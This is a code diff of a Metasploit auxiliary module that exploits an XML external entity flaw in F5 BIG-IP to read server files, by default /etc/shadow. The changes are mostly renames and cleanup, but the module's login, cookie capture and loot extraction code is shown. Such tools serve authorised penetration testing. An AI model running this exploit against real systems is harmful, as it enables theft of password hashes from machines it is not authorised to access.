@@ -18,10 +18,10 @@ class Metasploit4 < Msf::Auxiliary
 			'Name'         => 'F5 BIG-IP XML External Entity Injection Vulnerability',
 			'Description'  =>  %q{
 					This module attempts to read a remote file from the server using a
-				vulnerability in the way F5 BIG-IP handles XML files. The vulnerability
-				requires an authenticated cookie so you must have some access to the web
-				interface. F5 BIG-IP versions from 10.0.0 to 11.2.1 are known to be vulnerabile,
-				see F5 page for specific versions.
+				vulnerability in the way F5 BIG-IP handles XML files. The vulnerability requires
+				an authenticated cookie so you must have some access to the web interface. F5
+				BIG-IP versions from 10.0.0 to 11.2.1 are known to be vulnerabile, see F5 page for
+				specific versions.
 			},
 			'References'   =>
 				[
@@ -30,7 +30,6 @@ class Metasploit4 < Msf::Auxiliary
 					[ 'BID', '57496' ],
 					[ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130122-0_F5_BIG-IP_XML_External_Entity_Injection_v10.txt' ], # Original disclosure
 					[ 'URL', 'http://support.f5.com/kb/en-us/solutions/public/14000/100/sol14138.html'],
-					[ 'URL', 'https://www.neg9.org' ] # General
 				],
 			'Author'       =>
 				[
@@ -39,6 +38,7 @@ class Metasploit4 < Msf::Auxiliary
 					'Will Caput',      # Metasploit module
 					'Trevor Hartman',  # Metasploit module
 				],
+			'DefaultOptions' => { 'SSL' => true },
 			'DisclosureDate' => 'Jan 22 2013',
 			'License'      => MSF_LICENSE
 		)
@@ -50,12 +50,9 @@ class Metasploit4 < Msf::Auxiliary
 			OptString.new('TARGETURI', [true, 'Path to F5 BIG-IP', '/sam/admin/vpe2/public/php/server.php']),
 			OptString.new('RFILE', [true, 'Remote File', '/etc/shadow']),
 			OptString.new('USERNAME', [true, 'BIGIP Username', '']),
-			OptString.new('PASSWORD', [true, 'BIGIP Password', '']),
-			OptBool.new('SSL', [ true,  "Use SSL", true ])
-
+			OptString.new('PASSWORD', [true, 'BIGIP Password', ''])
 		], self.class)
 
-		register_autofilter_ports([ 443 ])
 		deregister_options('RHOST')
 	end
 
@@ -68,22 +65,24 @@ class Metasploit4 < Msf::Auxiliary
 		uri = normalize_uri(target_uri.path)
 		res = send_request_cgi({
 			'uri'     => uri,
-			'method'  => 'GET'})
+			'method'  => 'GET'
+		})
 
 		if not res
-			vprint_error("#{rhost}:#{rport} Unable to connect")
+			vprint_error("#{rhost}:#{rport} - Unable to connect")
 			return
 		end
 		# Next login to the F5 with valid credentials and grab a valid cookie header.
-		cookies = getlogincookies(datastore['USERNAME'], datastore['PASSWORD'])
+		cookies = get_login_cookies(datastore['USERNAME'], datastore['PASSWORD'])
 		if cookies.nil?
-			fail_with(Exploit::Failure::Unknown, "Failed to retrieve the session cookie")
+			vprint_error("#{rhost}:#{rport} - Failed to retrieve the session cookie")
+			return
 		end
 		# With a valid cookie, attempt to do XML attack and access shadow file.
-		accessfile(ip, cookies)
+		access_file(ip, cookies)
 	end
 
-	def getlogincookies(user, pass)
+	def get_login_cookies(user, pass)
 		vprint_status("Attempting login with '#{user}' : '#{pass}'")
 		begin
 			uri = normalize_uri(datastore['LOGINURI'])
@@ -96,7 +95,6 @@ class Metasploit4 < Msf::Auxiliary
 					'username' => user,
 					'passwd'   => pass
 				}
-
 			})
 			if not res or res.code != 302 or res.headers['Location'] =~ /\/login\.jsp/
 				print_status("FAILED LOGIN.")
@@ -110,12 +108,12 @@ class Metasploit4 < Msf::Auxiliary
 				return nil
 			end
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-			vprint_error("HTTP Connection in getlogincookie Failed, Aborting")
+			vprint_error("HTTP Connection in get_login_cookies Failed, Aborting")
 			return nil
 		end
 	end
 
-	def accessfile(rhost, cookies)
+	def access_file(rhost, cookies)
 		uri = normalize_uri(target_uri.path)
 		vprint_status("#{rhost}:#{rport} Connecting to F5 BIG-IP Interface")
 		begin
@@ -160,13 +158,12 @@ class Metasploit4 < Msf::Auxiliary
 					doc = REXML::Document.new(body)
 					doc.elements.each('message/messageBody/generalErrorText') do |e|
 						# Remove the extra text returned.
-						lootnode = e.get_text
-						if lootnode # Check bacause could be nil
+						loot_node = e.get_text
+						if loot_node # Check bacause could be nil
 							# Give me the data between the single quotes
-							#loot = lootnode.value.scan(/'([^']*)'/) # Bad with quoted loot
-							loot = lootnode.value[38..-2]
+							#loot = loot_node.value.scan(/'([^']*)'/) # Bad with quoted loot
+							loot = loot_node.value[38..-2]
 							if loot.empty? # Probably a patched F5
-
 								vprint_error("LOOT Empty.  F5 BIG-IP is Likely Patched")
 								return
 							end
@@ -185,7 +182,7 @@ class Metasploit4 < Msf::Auxiliary
 				end
 			end
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-			vprint_error("HTTP Connection in accessfile Failed, Aborting")
+			vprint_error("HTTP Connection in access_file Failed, Aborting")
 			return
 		end
 		vprint_error("#{rhost}:#{rport} Failed to retrieve file from #{rhost}:#{rport}")
